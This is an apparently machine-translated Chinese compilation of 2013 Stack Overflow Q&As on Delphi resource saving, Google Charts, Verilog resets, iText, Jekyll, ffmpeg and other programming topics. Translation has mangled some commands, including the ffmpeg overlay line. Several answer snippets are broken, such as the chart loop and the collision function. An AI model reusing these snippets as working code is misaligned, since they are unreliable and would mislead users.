谢谢大家。我有它，因为我是初学者，我对**$IfNDef Compiler Directive**感到不舒服。我使用了**Ken Whites 的代码**（[如何检查 delphi 操作系统版本？Windows 7 或 Server 2008 R2？](https://stackoverflow.com/questions/1268178/how-to-check-in-delphi-the-os-version-windows-7-or-server-2008-r2)）用于 Windows 检测和**Remy Lebeau 示例**（[系统目录中的资源保存](https://stackoverflow.com/questions/15998542/resource-saving-in-system-directory/16003247#16003247)）。它在**Delphi XE2**中完美运行。我的代码如下：

```
unit ApplicationWizard01;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Buttons;

type
  TMainForm = class(TForm)
    BitBtn01: TBitBtn;
    procedure BitBtn01Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  MainForm: TMainForm;

var
  GetNativeSystemInfo: function(var SysInfo: TSystemInfo): BOOL stdcall = nil;
var
  GetProductInfo: function (dwOSMajorVersion, dwOSMinorVersion,
                            dwSpMajorVersion, dwSpMinorVersion: DWORD;
                            var pdwReturnedProductType: DWORD): BOOL stdcall = nil;

implementation

{$R *.dfm}

function GetSysDir: string;
var
  SystemDirectory: array[0..MAX_PATH] of Char;
begin
  GetSystemDirectory(SystemDirectory, MAX_PATH - 1);
  SetLength(Result, StrLen(SystemDirectory));
  Result := IncludeTrailingPathDelimiter(SystemDirectory);
end;

function GetSysNativeDir: string;
var
  WindowsDirectory: array[0..MAX_PATH] of Char;
begin
   GetWindowsDirectory(WindowsDirectory, MAX_PATH - 1);
   SetLength(Result, StrLen(WindowsDirectory));
   Result := IncludeTrailingPathDelimiter(WindowsDirectory)  + 'Sysnative\';
end;

procedure TMainForm.BitBtn01Click(Sender: TObject);
var
  NTBres, BRes: Boolean;
  OSVI: TOSVERSIONINFO;
  OSVI_NT: TOSVERSIONINFOEX;
  SI: TSystemInfo;
  ResStream: TResourceStream;
  ResourceSavingPathAndFileName : string;
begin
  NTBRes := false;
  try
    OSVI_NT.dwOSVersionInfoSize := SizeOf(TOSVERSIONINFOEX);
    NTBRes := GetVersionEx(OSVI_NT);
    OSVI.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
    BRes := GetVersionEx(OSVI);
  except
    OSVI.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
    BRes := GetVersionEx(OSVI);
  end;
  if (not BRes) and (not NTBres) then Exit;
  Move( OSVI, OSVI_NT, SizeOf(TOSVersionInfo) );
  if Assigned(GetNativeSystemInfo) then GetNativeSystemInfo(SI) else GetSystemInfo(SI);
  if (SI.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_INTEL) then
    begin
      ResourceSavingPathAndFileName := (GetSysDir);
      ResStream := TResourceStream.Create(HInstance, 'DynamicLlinkLibraryWin32', RT_RCDATA);
      try
        ResStream.SaveToFile(ResourceSavingPathAndFileName + 'FileWin32.dll');
      finally
        ResStream.Free;
      end;
    end
  else if (SI.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64) then
    begin
      ResourceSavingPathAndFileName := (GetSysNativeDir);
      ResStream := TResourceStream.Create(HInstance, 'DynamicLlinkLibraryWin64', RT_RCDATA);
      try
        ResStream.SaveToFile(ResourceSavingPathAndFileName + 'FileWin64.dll');
      finally
        ResStream.Free;
      end;
    end;
  ShowMessage ('Resource Has Been Saved Successfully');
end;

initialization
  @GetProductInfo := GetProcAddress(GetModuleHandle('KERNEL32.DLL'),
                                     'GetProductInfo');

  @GetNativeSystemInfo := GetProcAddress(GetModuleHandle('KERNEL32.DLL'),
                                         'GetNativeSystemInfo');

end. 
```

# javascript - 谷歌折线图如何不插入丢失的数据

> ID：15998545
> 
> 赞同：4
> 
> 时间：2013-04-14T11:26:52.407
> 
> 标签：javascript, google-visualization

我有一个包含一系列事件的数据库表，这些事件有它们发生的日期。现在我想显示每个月的事件数量并在折线图中显示它们。我通过 php 获取数据并使用 data.addrow 在循环中生成 js 代码

现在这工作正常，但如果有一个月没有事件，它将不会添加为一行，并且该行将简单地插入缺少的月份。因此，例如 1 月 5 日的事件、2 月 0 日和 3 月 5 日的事件，将创建一条从 1 月到 3 月的水平线，使其看起来像 2 月的 5 个事件。

我怎样才能让“空”月的线路降为零？

我需要用 null 填充空行/月吗？这似乎不太实用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T00:41:55.833

如果你想让这条线下降到零，你就是在插值，只是以不同的方式。Google 为您提供了两种使用[`interpolateNulls`](https://developers.google.com/chart/interactive/docs/gallery/linechart#Configuration_Options)选项处理空值（null）的方法：

1.  *True*将猜测介于两者之间的值（图表中的当前行为）
2.  *False*将在空数据点的行中留下一个中断（不是你想要的）

要使所有空值显示为零，您需要使用 for 循环遍历数据并将任何空值更改为 0。类似于下面的代码。

```
for (i = 0; i < data.getNumberOfRows(); i++) {
  if ( data.getValue(1, i) == null )
    data.setValue(1, i) = 0
} 
```

上面的代码没有经过测试，也不知道你的数据是怎么设置的，所以也没花多少时间去测试（不知道你的数据有多少列等等，可以调整测试如所须）。

# verilog - 在触发器中使用集合

> ID：15998546
> 
> 赞同：1
> 
> 时间：2013-04-14T11:27:00.800
> 
> 标签：verilog, flip-flop

1）我了解在 ASIC 中使用重置从已知状态开始。喜欢

```
always @ (posedge clk or negedge reset)
begin 
if (reset)
//Initialize the signals
else 
//do something
end 
```

但如果是这样的话，为什么我们不使用`set`信号并从不同的状态开始并最终结束电路应该做的事情？这看起来很愚蠢，但我很好奇，就是这样。我从来没有见过像这样的代码这个。

```
 always @ (posedge clk or negedge set)
    begin 
    if (set)
    //Initialize the signals
    else 
    //do something
    end 
```

2）另外，我读到有必要使用条件`if/else`重置的语句对重置信号进行建模`if`。谁能给我一个例子，否则怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T15:41:41.670

您的问题中的示例有一个小错误，应该是：

```
always @ (posedge clk or negedge reset) begin 
  if (~reset) begin //<-- Reset when rest low
    //Initialize the signals
  end
  else begin 
    //do something
  end
end 
```

当`negedge reset`信号变低时将触发，因此您希望重置条件匹配。这是一个低电平有效复位。对于您想要的高电平有效复位（Reset when `reset == 1`）：

```
always @ (posedge clk or posedge reset) begin //<--Posedge trigger reset
  if (reset) begin //<-- Reset when rest high
    //Initialize the signals
  end
  else begin 
    //do something
  end
end 
```

重置条件不必为 0。它可以是任何东西，但它必须是已知的静态值。即NOT`next_state`等`a+b`。它连接触发器的复位引脚，这就是我们保持名称复位的原因。

ASIC 中首选低电平有效复位，因为没有电源时它处于复位状态。当芯片启动时，您通常会在时钟的位置同步释放复位。通常至少有 2 个姿势。这避免了少量时间的复位故障。

因为您希望在芯片上电时应用低电平有效复位，所以当上电时一切都处于已知状态，我们使用异步复位。使用同步重置，您不知道第一个状态是什么。需要清除数据的状态机和过滤器经常使用同步复位。异步复位用于上电复位 (POR) 以设置已知值。

使用该`if (reset) else`结构以便综合工具可以将其视为具有异步复位的触发器，尝试另一个结构可能会很好地模拟，甚至可能会合成（不正确），但您很容易会遇到硬件错误，而这些错误不会在模拟制作中显示调试非常困难。

您可能有兴趣阅读[设置复位触发器 (SR Flip-Flop)](http://en.wikipedia.org/wiki/Flip-flop_%28electronics%29#Gated_SR_latch)。这只是一个没有切换功能的 JK。

可以使用以下暗示：

```
always @ (posedge clk or negedge reset or posedge set) begin 
  if (~reset) begin 
    //reset the signals
  end
  else if (set) begin
    //set the signals
  end
  else begin 
    //do something
  end
end 
```

# itext - 文件是抽象的；无法实例化

> ID：15998549
> 
> 赞同：2
> 
> 时间：2013-04-14T11:27:55.527
> 
> 标签：itext

```
try {
  Document document = new Document();
  PdfWriter.getInstance(document, new FileOutputStream("Report.pdf"));
  document.open();
  document.add(new Paragraph("Hello World"));
  document.close();
} catch (Exception e) {
  JOptionPane.showMessageDialog(null, e);
} 
```

这是我在 NetBeans 中编写的代码，但在第一行出现错误：

```
error 1 in 1st line: Document is abstract; cannot be instantiated 

error 2 in 2nd line cannot find symbol ,symbol: variable PdfWriter 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-14T11:37:35.143

您显然导入了错误的`Document`类，正确的导入是[com.itextpdf.text.Document](http://api.itextpdf.com/itext/com/itextpdf/text/Document.html)，更新您的导入语句，这将得到修复。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-02-07T01:34:24.727

要解决此问题，您必须复制并粘贴此导入语句：它将工作 100% import com.itextpdf.text.Document;

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-10-15T06:22:56.183

**下载 itext-5.1.3**它将 100% 肯定地工作。:)**并将所有 JAR 添加到您的项目中。** 我遇到了同样的问题并解决了。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-03-21T11:42:32.287

**消除**

`import javax.swing.text.Document;`

并**添加**

`import com.itextpdf.text.Document;`

# javascript - 修改背景：使用 javascript 的 webkit-gradient

> ID：15998561
> 
> 赞同：2
> 
> 时间：2013-04-14T11:29:33.173
> 
> 标签：javascript, html, css, webkit, gradient

这应该相当简单。我需要做的就是使用从链接调用的 javascript 函数将一个新的参数块传递给我的 body css 标记 webkit 渐变。这是我尝试过的（在其他 200 项中）：

CSS

```
body
{
    -webkit-text-size-adjust:100%;
    font-size:100%;
    color:#444;
    position:relative;
    background: -webkit-linear-gradient(top, #154d9e, #b8d8e4);
} 
```

Javascript

```
<script>
function changeBack()
{
    document.getElementsByTagName("body").style.background="-webkit-linear-gradient(top, #fff, #000)";
    document.body.style.background="-webkit-linear-gradient(top, #fff, #000)";
}
</script> 
```

这两条线都不起作用。是什么赋予了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-14T12:34:37.763

这不起作用，因为*document.getElementsByTagName("body")*返回一个元素数组。您需要指定它是哪个元素。页面上只有一个 body 标签，所以这应该可以工作：

```
document.getElementsByTagName("body")[0].style.background="-webkit-linear-gradient(top, #fff, #000)"; 
```

# c++ - 不同的物体碰撞

> ID：15998565
> 
> 赞同：2
> 
> 时间：2013-04-14T11:30:02.887
> 
> 标签：c++, c, geometry

我只想检查两个物体是否碰撞，在这种情况下它是一个圆形，第二个是一个正方形。我正在使用的代码完美运行，但它只检查正方形的**右侧**和**向下/底部**是否发生碰撞，请帮我纠正它，以便我能够检查所有侧面的碰撞。

![在此处输入图像描述](https://i.stack.imgur.com/tgIvo.png)

问题是我只想检查正方形的所有边，如果它与圆相撞，但它只检查下面的函数的两个边：

```
 bool Collision(int circleX, int circleY, int radius, 
                   int squareX, int squareY, int width, int height)
    {

        double distance = 0;

        //get circle of square
        double center_square_x = (double)(squareX + squareX + width)/2;
        double center_square_y = (double)(squareY + squareY + height)/2;

        //check for whether circle fully located inside square
        if (circleX >= squareX && circleX <= squareX + width
            && circleY >= squareY && circleY <= squareY + height)
            return true;

        distance =  pow (circleX - center_square_x,2.0) 
                  + pow(circleY - center_square_y,2.0);

        if( distance <= pow(radius, 2.0))
           return true; 
       else    
           return false;
     } 
```

**显示错误的图片：**

当圆圈靠在左边并且仍然没有碰到正方形时：

![在此处输入图像描述](https://i.stack.imgur.com/lUcDg.jpg)

现在，当它触摸正方形时，它会根据需要返回 true：

![在此处输入图像描述](https://i.stack.imgur.com/f7S4a.jpg)

当圆圈靠在右边并且仍然没有碰到正方形时，它返回 false：

![在此处输入图像描述](https://i.stack.imgur.com/t1cQ8.jpg)

现在当它触及正方形时，它仍然返回错误，这是错误的：

![在此处输入图像描述](https://i.stack.imgur.com/FbINU.jpg)

当圆圈上升到正方形的底部并触摸时，它返回 true，这是正确的：

![在此处输入图像描述](https://i.stack.imgur.com/83Vqf.jpg)

但是当圆圈下降到正方形的顶部并触摸时，它返回 false，这是错误的：

![在此处输入图像描述](https://i.stack.imgur.com/S0YGe.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T18:18:54.123

试试这个

```
bool Collision(int circleX, int circleY, int radius, 
               int squareX, int squareY, int width, int height)
{

    double distance = 0;

    //get circle of square (the center of the rectangle or square is
    // (squareX + width)/2 and (squareY+height)/2

    double center_square_x = (double)(squareX + width)/2;
    double center_square_y = (double)(squareY + height)/2;

    // check for each segment the circle position

    // check if the circle is between the bottom and upper square segments
    if (circleY >= squareY && circleY <= squareY + height) 
           // check for left segment
           if (circleX >= squareX && circleX < centerX )
           return true;
           // check for right segment
       else if (circleX <= squareX+width && circleX > centerX)
           return true;
     // check if the circle is between left and right square segments
    else if (circleX >= squareX && circleX <= squareX + width)
         // check for upper segment
         if (circleY >= squareY && circleY < centerY)
           return true;
         // check for bottom segment
        else if (circleY <= squareY + height && circleY > centerY)
           return true; 
```

我不知道你想通过距离计算来实现什么，但它不会到达那里。因为当你在检查碰撞后返回 true 时，函数将退出它的范围。

# java - 使用Apache POI在java中读取和写入xls和xlsx excel文件

> ID：15998570
> 
> 赞同：12
> 
> 时间：2013-04-14T11:30:42.060
> 
> 标签：java, excel, apache-poi

我正在编写一个程序，它需要从 excel 文件中读取和写入，无论格式如何（xls 或 xlsx）。

我知道 Apache POI，但它似乎有不同的类来处理 xls 文件（HSSF）和 xlsx（XSSF）文件。

任何知道我如何实现我在这里想要做的事情的人。（也欢迎使用 POI 以外的 API 的想法）。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2013-04-14T15:41:28.730

很简单，使用常用的[SpreadSheet接口即可](http://poi.apache.org/spreadsheet/how-to.html#user_api)

您的代码将类似于：

```
 Workbook wb = WorkbookFactory.create(new File("myFile.xls")); // Or .xlsx
 Sheet s = wb.getSheet(0);
 Row r1 = s.getRow(0);
 r1.createCell(4).setCellValue(4.5);
 r1.createCell(5).setCellValue("Hello");

 FileOutputStream out = new FileOutputStream("newFile.xls"); // Or .xlsx
 wb.write(out);
 out.close(); 
```

只要您使用通用接口，您就可以使用完全相同的代码读取、写入、编辑等现有文件，包括 .xls 和 .xlsx

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:37:18.733

为什么不从扩展中检测文件类型并使用适当的 Apache POI 类进行处理？我怀疑您的情况是否有一个绝对通用的开箱即用解决方案。

# ios - 在 UITableView 中实现 Accordian 的最佳方法

> ID：15998572
> 
> 赞同：0
> 
> 时间：2013-04-14T11:30:52.787
> 
> 标签：ios, ios6, uitableview

我只想在我的 UITableView 行（可能是第二行）中实现手风琴，我想在不使用任何自定义类或自定义单元类的情况下实现它。单击手风琴行“n”行应添加到该行下，我还想跟踪该行的行 didSelectRow() 委托方法以及独立的其他行。感谢您提供任何帮助的最佳方法。

[可能重复](https://stackoverflow.com/questions/8325262/how-to-give-accordian-effect-to-table-row-iphone)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T13:10:48.423

在方法的帮助下，我用一个普通的 UITableView 做了一次，没有任何自定义单元格`tableView:viewForHeaderInSection:`。我使用这种方法将每个部分的标题设计为折叠/展开其行的按钮。

您应该维护一个布尔数组，指示特定部分是否已展开，即其行是否可见。该数组应以所有值 false 开头。然后，当单击节标题时，您应该将其在数组中的值更改为 true。

如果该部分折叠，该方法`tableView:numberOfRowsInSection`将返回 0，如果该部分展开，则返回该部分中的行数。

最后，您应该使用该`reloadSections:withRowAnimation:`方法为展开/折叠设置动画。

# jquery - jquery切换显示的表单不起作用

> ID：15998574
> 
> 赞同：1
> 
> 时间：2013-04-14T11:31:04.047
> 
> 标签：jquery

我在使用 jQuery 时遇到问题。

我制作了一个登录页面，其中显示了一个用于注册的小 div。默认情况下，此 div 是隐藏的，我使用 jQuerys 切换方法在单击注册按钮时显示它。

问题是当这个表单出现时，点击提交按钮没有做任何事情（不发送 POST 请求）

```
<div id='signup-box' >
  <form method="post">
      <p>Name:
      <input type="text" name="username" value=""></p>
      <p>Password:
      <input type="password" name="password" value=""></p>
      <p><input type="submit" value="Signup"/></p>
  </form>
</div>

$('#show-signup-form').on('click', function(){
    $('#signup-box').toggle();
    return false;
}); 
```

PS如果我改变`id`形式，它总是显示出来并且效果很好。

# sql - 我怎样才能让一个序列在oracle中增加一？

> ID：15998575
> 
> 赞同：0
> 
> 时间：2013-04-14T11:31:13.453
> 
> 标签：sql, oracle

目前我有一个格式的序列：

```
 CREATE SEQUENCE calc_emp_id
      MINVALUE 1001 MAXVALUE 10000
      START WITH 1006 INCREMENT BY 1 ORDER NOCACHE; 
```

我要插入的表已经有六个插入，我试图让下一个插入的主键为 1007。第一个插入增加 2，后续插入增加 3。我在插入语句中使用 calc_emp_id.NEXTVAL 插入。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T11:36:15.540

尝试在 nextval 之后使用 CURRVAL

# c# - 从 MVC4 中的 URL 中删除控制器名称

> ID：15998576
> 
> 赞同：0
> 
> 时间：2013-04-14T11:31:21.073
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-4, asp.net-mvc-routing

我正在动态构建 URL 以传递给 jQuery 按钮单击事件处理程序。

URL 来自模态窗口定义：

```
<div class="modal hide fade in" id="modal-view-tenant-profile" 
data-url="Tenants/ViewProfile">...</div> 
```

id 来自一个按钮：

```
<button class="btn btn-primary btn-block show-modal" 
data-id="@result.UserId">View profile</button> 
```

在我的 JS 函数中，我抓取了两条数据

```
var url = "Tenants/ViewProfile";
var id = $(this).attr('data-id'); 
```

并像这样构造 URL`$.get(url + '/' + id, function (data))...`

要工作，URL 应该如下所示：

```
http://localhost:1840/Tenants/ViewProfile/2 
```

但是因为这个控制器操作是从登录的 Lanlord 调用的，所以 URL 看起来像这样：

```
http://localhost:1840/Landlords/Tenants/ViewProfile/2 
```

我知道我需要创建一个新路由来忽略 URL 的“房东”部分，当房东从租户控制器调用操作时，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T12:39:21.747

在租户前添加反斜杠

```
var url = "/Tenants/ViewProfile"; 
```

# vb.net - 如何将特定 SQL 结果值添加到 Visual Studio 2012 中 HTML 表中的特定单元格

> ID：15998579
> 
> 赞同：0
> 
> 时间：2013-04-14T11:31:33.763
> 
> 标签：vb.net, sql-server-2008, visual-studio-2012, datasource

我在结果集中有一系列总计，如下所示：

![SQL 结果](https://i.stack.imgur.com/d8uH6.png)

我想做的是将这些结果填充到 HTML 表格中，但特定结果需要进入特定单元格，即拆分为不同的列和不同的行，例如：

![结果表](https://i.stack.imgur.com/wCfqc.png)

是否有我可以使用的 Visual Studio 控件，或者我应该设置一个包含多个连接到数据库的数据源的 html 表，然后拆分我的查询？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T08:07:27.587

> 感谢模拟，我想知道细胞是如何确定的，我根本没有解释清楚！从您到目前为止所展示的内容来看，除了可以容纳它的表格之外，我想不出其他控件。如果每个值使用哪个单元格背后有一组逻辑，则可能值得进行自定义控件。

祝你好运，干杯

# jekyll - 列出所有 Jekyll 帖子时自动添加类

> ID：15998587
> 
> 赞同：0
> 
> 时间：2013-04-14T11:32:32.767
> 
> 标签：jekyll

我想按时间顺序列出所有 Jekyll 帖子，并且同一类别中的所有帖子都将具有与我给出的相同的类名（例如`cate1`，，`cate2`... `cate3`）。我已经尝试了很多方法，仍然无法解决这个问题。你能帮我吗？

例如，以下代码可以按时间顺序列出所有帖子，但所有链接都将具有相同的`cate1`类。

```
{% for post in site.posts %}
  {% if site.categories.CATEGORY1 %}
    <a class="cate1" href="{{ post.url }}">{{ post.title }}</a>
  {% elsif site.categories.CATEGORY2 %}
    <a class="cate2" href="{{ post.url }}">{{ post.title }}</a>
  {% elsif site.categories.CATEGORY3 %}
    <a class="cate3" href="{{ post.url }}">{{ post.title }}</a>
  {% endif %}
{% endfor %} 
```

我也试过：

```
{% for post in site.posts %}
  {% for post in site.categories.CATEGORY1 %}
    <a class="cate1" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
  {% for post in site.categories.CATEGORY2 %}
    <a class="cate2" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
  {% for post in site.categories.CATEGORY3 %}
    <a class="cate3" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
{% endfor %} 
```

这将生成每个链接 13 次，这是我的帖子总数。链接顺序基于循环中类别的顺序，而不是按时间顺序。

我也试过：

```
{% for post in site.posts %}
  {% for CATEGORY1 in site.categories %}
    <a class="cate1" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
  {% for CATEGORY2 in site.categories %}
    <a class="cate2" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
  {% for CATEGORY3 in site.categories %}
    <a class="cate3" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
{% endfor %} 
```

这将生成每个链接 25 次。我想这是因为我有 5 个类别和 5*5=25。每个链接将有不同的类名（例如`a_CATEGORY1_post.cate1`, `a_CATEGORY1_post.cate2`, `a_CATEGORY1_post.cate3`）。但所有帖子都是按时间顺序排列的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-14T17:44:09.823

您将希望在帖子循环中进行另一个循环**，**如下所示：

```
{% for post in site.posts %}
  {% for cat in post.categories %}
      <a class="{{ cat }}" href="{{ post.url }}">{{ post.title }}</a>
  {% endfor %}
{% endfor %} 
```

有关循环中可访问内容的详细信息，请参见此处：
[https ://github.com/mojombo/jekyll/wiki/template-data](https://github.com/mojombo/jekyll/wiki/template-data)

这种方法有两个问题：

1.  如果您的某个帖子**没有**分配给它的类别，它将不会被列出。所以你可能也想检查一下。

2.  如果将同一帖子分配给多个类别，您会多次列出相同的帖子。因此，为此，我将使用 Liquid Filters 重做代码，使其如下所示：`class="cat1 cat2 cat3"`像这样：

    ```
    {% for post in site.posts %}
      <a class="{{ post.categories | join: ' ' }}" href="{{ post.url }}">{{ post.title }}</a>
    {% endfor %} 
    ```

液体过滤器见这里：
[https ://github.com/shopify/liquid/wiki/liquid-for-designers](https://github.com/shopify/liquid/wiki/liquid-for-designers)

**编辑：**你的意思是你想为每个链接添加一个唯一的类而不是类别名称？不知道你说的*具体*是什么意思。对于*独特的*，您可以在零件之前做一个`case`声明`<a href`：

```
 {% case condition %}
    {% when cat = 'cat1' %}
      cat = 'unique_class_1'
    {% when cat = 'cat2' %}
      cat = 'unique_class_2'
    {% else %}
      ... else ...
  {% endcase %} 
```

但是在那种情况下，为什么类别类不够独特呢？

**编辑** *Peiwin 评论的示例 3* - 我不建议这样做，因为它是糟糕的编码实践。而是使用您的 jQuery 以使其更灵活并使用上面的#2：

```
{% for post in site.posts %}
  {% for cat in post.categories %}
    {% case condition %}
      {% when cat = 'cat1' %}
        {% assign cat_class = 'unique_class_1' %}
      {% when cat = 'cat2' %}
        {% assign cat_class = 'unique_class_2' %}
      {% else %}
        ... else ...
    {% endcase %}
  {% endfor %}

  <a class="{{ cat_class }}" href="{{ post.url }}">{{ post.title }}</a>
{% endfor %} 
```

# c++ - char指针上的C++错误

> ID：15998589
> 
> 赞同：4
> 
> 时间：2013-04-14T11:32:41.143
> 
> 标签：c++, char-pointer

我想在结构内初始化一个 char* 字符串。

这是结构：

```
typedef struct __String  {
    char*    data;        // C-string data, 
    unsigned* copyRef;     // number of copy reference, delete only when the copyRef is 0
    bool     isACopy;     // this boolean is true when *data is a ref to an other MyString

  __String () {
      data = 0;
      isACopy = false;
      copyRef = new unsigned();
      *copyRef = 0;
      return;
 }

    void addCopyRef() {
        *copyRef++;
    }

    void removeCopyRef() {
        *copyRef--;
    }
 } *MyString; 
```

这就是它崩溃的地方..

```
void Initialize(MyString& string){

    string->data = new char[LENGHT];
    string->data[0] ='\0'; // this generate an error!
    string->addCopyRef();
} 
```

这是主要的：

```
MyString left_string, right_string, both_string;
Initialize(left_string);
Initialize(right_string);
Initialize(both_string); 
```

第一个进展顺利，第二个没有..请你帮我理解问题出在哪里？谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-14T11:46:37.250

You need to allocate memory for the objects before passing them like this:

```
MyString left_string = new __String();
Initialize(left_string); 
```

As a general suggestion don't do such typedefs, they are very confusing and are error prone. If you do decide to typedef a pointer at least indicate it's a pointer in the type, i.e: `typedef struct __String* MyStringPtr`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-14T11:50:42.683

```
typedef struct __String  {
  char*    data;        // C-string data,
  unsigned* copyRef;    // number of copy reference,
                        // delete only when the copyRef is 0
  bool     isACopy;     // this boolean is true when *data
                        // is a ref to an other MyString

  __String () {
    data = 0;
    isACopy = false;
    copyRef = new unsigned;
    *copyRef = 0;
    return;
  }

  void addCopyRef() {
    *copyRef++;
  }

  void removeCopyRef() {
    *copyRef--;
  }
} *MyString;

void Initialize(MyString& string){

  string->data = new char[100];
  string->data[0] ='\0'; // this generate an error!
  string->copyRef = new unsigned();
  string->addCopyRef();
}

int main()
{
  MyString mystring = new struct __String;
  Initialize(mystring);
} 
```

我这样测试没有任何错误。在 Linux 上使用 g++。我觉得你最好

*   至少在这里提供错误信息
*   以及您使用的编译器和平台。

我用下面的另一个 main() 再次测试。

```
int main()
{
  MyString mystring = new struct __String;
  MyString mystring1 = new struct __String;
  MyString mystring2 = new struct __String;
  Initialize(mystring);
  Initialize(mystring1);
  Initialize(mystring2);
} 
```

使用此测试代码，没有错误。`mystring`我认为您错过了实例化由（在您的代码中`left_string`，，，，`right_string`）指向的对象`both_string`。我猜这就是原因。

这段代码会从构造函数中产生内存泄漏。在这种代码状态下，不需要构造函数。

# xslt - 在 xsl 文件中转义“ ”

> ID：15998591
> 
> 赞同：0
> 
> 时间：2013-04-14T11:32:52.337
> 
> 标签：xslt, escaping

如何转义XSL中的`<`,​​ 字符？`>`

相关的代码行是：

```
<td class="some_class" onclick='pop(this.title)'> 
```

我想更改为：

```
<td class="some_class" onclick='pop(this.title+"<br>"+this.name')> 
```

失败并显示以下消息（在 Chrome 中）：

```
error on line 928 at column 60: Unescaped '<' not allowed in attributes values 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T11:32:52.337

使用`&lt;`和`&gt;`：

```
<td class="some_class" onclick='pop(this.title+"&lt;br&gt;"+this.name')> 
```

# xml - XQuery XmlSpy 删除

> ID：15998593
> 
> 赞同：0
> 
> 时间：2013-04-14T11:33:01.890
> 
> 标签：xml, xquery, altova, xmlspy

我正在尝试使用 Altova XMLSpy 中的内置 XQuery 编译器通过 XQuery 删除 XML 节点。

```
xquery version "1.0" encoding "UTF-8";
for $customer in doc("Customers.xml")/dataroot/Customers
where $customer/CustomerID = "ALFKI"
return delete node $customer; 
```

问题是编译器没有将“删除节点”视为有效语法，而它在此处定义：http: [//www.w3.org/TR/xquery-update-10/](http://www.w3.org/TR/xquery-update-10/)

它抱怨错误“意外的令牌节点 $customer”。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-28T13:28:58.467

事实是 XMLSpy 不支持 XQuery 更新工具，因此 delete 关键字无效

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-14T16:33:54.027

删除 后放错位置的分号`$customer`。

```
xquery version "1.0" encoding "UTF-8";
for $customer in doc("Customers.xml")/dataroot/Customers
where $customer/CustomerID = "ALFKI"
return delete node $customer (: here was the semicolon :) 
```

否则，您的 XQuery 是有效的。

# video - 一次覆盖并组合ffmpeg

> ID：15998599
> 
> 赞同：0
> 
> 时间：2013-04-14T11:34:24.860
> 
> 标签：video, ffmpeg

初始情况

*   video1，h264（但我猜编解码器实际上并不重要），持续时间 10 秒，不透明
*   video2，flv，时长 10 秒，透明度

使用 video1 作为“开始”、“背景”剪辑。然后在第 5 秒后，我想在其上覆盖 video2。产生一个 15 秒的剪辑。

让我更形象地解释一下

```
video1: 111111111111111111
video2:          222222222222222222
result: 111111111333333333222222222 
```

像这样使用 FFmpeg 覆盖过滤器

```
ffmpeg -i K00187_KOMIKER_NIAVARANI_MICHAEL_01.mp4 -i alpha_vid.flv \
  -filter_complex“覆盖”测试.mp4

```

当然，这只是覆盖两个视频并在 video1 结束后立即停止。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-14T15:01:32.203

这听起来像是一份工作`-itsoffset`

```
ffmpeg -i K00187_KOMIKER_NIAVARANI_MICHAEL_01.mp4 -itsoffset 10 \
  -i alpha_vid.flv -filter_complex overlay test.mp4 
```

# c# - 有没有办法将字符串拖到控制台应用程序上？

> ID：15998602
> 
> 赞同：2
> 
> 时间：2013-04-14T11:34:34.083
> 
> 标签：c#, drag-and-drop, console

我有一个小型控制台程序，我希望它具有如下行为：

```
*我将（URL）字符串拖到控制台应用程序
*控制台应用程序获取放入的字符串，然后使用该字符串调用函数。

```

但是，我似乎无法找到一种方法来做到这一点。根据 MSDN，Console 类中没有允许我执行此操作的事件。谁能帮我？

注意：这是在应用程序打开时。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-11T23:02:18.450

我不这么认为。您的应用程序不拥有其运行所在的窗口，因此这将阻止您的程序接受拖动的 URL。请注意光标如何变为禁止符号？窗口正在检查拖动对象上的数据并确定它不能对它们做任何事情。

现在，您可能会通过修改控制台模拟器（例如开源[ConEmu](https://code.google.com/p/conemu-maximus5/) ）来获得一些运气，但您必须确保您的用户使用的是相同版本的模拟器。

# c - 如何告诉编译器在 ARM 中使用硬件浮点指令

> ID：15998609
> 
> 赞同：2
> 
> 时间：2013-04-14T11:35:20.207
> 
> 标签：c, gcc, makefile, arm

我正在为 ARM 编译一个程序。makefile 有一个标志*-msoft-float*，它告诉编译器使用软件浮点仿真。我的问题是如何在 makefile 中指定使用硬件浮点指令。我试过*-mhard-float*，但如果我这样做，我会得到错误。我也尝试过*-msoftfp-float*，正如[本网站](http://gcc.gnu.org/onlinedocs/gcc-4.1.2/gcc/ARM-Options.html)所说，但编译器甚至无法识别该标志。所以，请告诉我应该如何解决这个问题。

* * *

